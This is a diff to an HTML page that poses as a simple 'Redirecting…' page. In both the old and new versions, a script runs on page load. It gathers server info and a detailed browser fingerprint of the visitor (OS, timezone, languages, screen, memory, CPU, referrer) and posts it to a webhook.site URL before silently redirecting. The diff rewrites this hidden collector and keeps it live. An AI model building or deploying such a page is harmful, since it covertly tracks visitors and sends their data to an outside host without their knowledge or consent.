@@ -3,91 +3,77 @@
 <head>
   <meta charset="UTF-8">
   <title>Redirecting…</title>
-
   <meta http-equiv="refresh" content="2;url=https://example.com">
 </head>
 <body>
-<script>
-  const REDIRECT_URL = "https://example.com";  
-  const WEBHOOK_URL  = "https://webhook.site/5c51d1ab-3a36-41a6-871c-d06526fa191d";
+  <script>
+    const REDIRECT_URL = "https://example.com";
+    const WEBHOOK_URL  = "https://webhook.site/5c51d1ab-3a36-41a6-871c-d06526fa191d";
 
-  function getBrowserInfo() {
-    const ua = navigator.userAgent;
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
 
-    let browser = "Unknown";
-    if (ua.includes("Firefox")) browser = "Firefox";
-    else if (ua.includes("Edg")) browser = "Edge";
-    else if (ua.includes("Chrome")) browser = "Chrome";
-    else if (ua.includes("Safari")) browser = "Safari";
+      let browser = "Unknown";
+      if (ua.includes("Firefox")) browser = "Firefox";
+      else if (ua.includes("Edg")) browser = "Edge";
+      else if (ua.includes("Chrome")) browser = "Chrome";
+      else if (ua.includes("Safari")) browser = "Safari";
 
-    let os = "Unknown";
-    if (ua.includes("Win")) os = "Windows";
-    else if (ua.includes("Mac")) os = "MacOS";
-    else if (ua.includes("Linux")) os = "Linux";
-    else if (ua.includes("Android")) os = "Android";
-    else if (ua.includes("iPhone")) os = "iOS";
+      let os = "Unknown";
+      if (ua.includes("Win")) os = "Windows";
+      else if (ua.includes("Mac")) os = "MacOS";
+      else if (ua.includes("Linux")) os = "Linux";
+      else if (ua.includes("Android")) os = "Android";
+      else if (ua.includes("iPhone")) os = "iOS";
 
-    return { browser, os };
-  }
-
-  async function collectAndSend() {
-    try {
-      const serverData = await fetch("/api/info").then(r => r.json());
-      const { browser, os } = getBrowserInfo();
-
-      const payload = {
-        ...serverData,
-        client: {
-          browser,
-          os,
-          platform: navigator.platform,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
-          languages: navigator.languages,
-          screen: {
-            width: screen.width,
-            height: screen.height,
-            color_depth: screen.colorDepth
-          },
-          cookies_enabled: navigator.cookieEnabled,
-          online: navigator.onLine,
-          device_memory_gb: navigator.deviceMemory || "Unknown",
-          cpu_cores: navigator.hardwareConcurrency || "Unknown",
-          referrer: document.referrer || "None",
-          local_time: new Date().toString()
-        }
-      };
-
-      // Try sendBeacon first
-      let sent = false;
-      if (navigator.sendBeacon) {
-        try {
-          const blob = new Blob(
-            [JSON.stringify(payload)],
-            { type: "application/json" }
-          );
-          sent = navigator.sendBeacon(WEBHOOK_URL, blob);
-        } catch (e) {}
-      }
-      if (!sent) {
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload),
-          keepalive: true
-        });
-      }
-
-    } catch (err) {
-      console.error("Webhook error:", err);
+      return { browser, os };
     }
-    setTimeout(() => {
-      window.location.replace(REDIRECT_URL);
-    }, 800);
-  }
 
-  collectAndSend();
-</script>
+    async function collectAndRedirect() {
+      try {
+        const serverData = await fetch("/api/info").then(r => r.json());
+        const { browser, os } = getBrowserInfo();
 
+        const payload = {
+          ...serverData,
+          client: {
+            browser,
+            os,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            languages: navigator.languages,
+            screen: {
+              width: screen.width,
+              height: screen.height,
+              color_depth: screen.colorDepth
+            },
+            cookies_enabled: navigator.cookieEnabled,
+            online: navigator.onLine,
+            device_memory_gb: navigator.deviceMemory || "Unknown",
+            cpu_cores: navigator.hardwareConcurrency || "Unknown",
+            referrer: document.referrer || "None",
+            local_time: new Date().toString()
+          }
+        };
+
+        if (WEBHOOK_URL.startsWith("http")) {
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          }).catch(() => {});
+        }
+
+      } catch (e) {
+
+      }
+      setTimeout(() => {
+        window.location.replace(REDIRECT_URL);
+      }, 300);
+    }
+
+    collectAndRedirect();
+  </script>
 </body>
 </html>
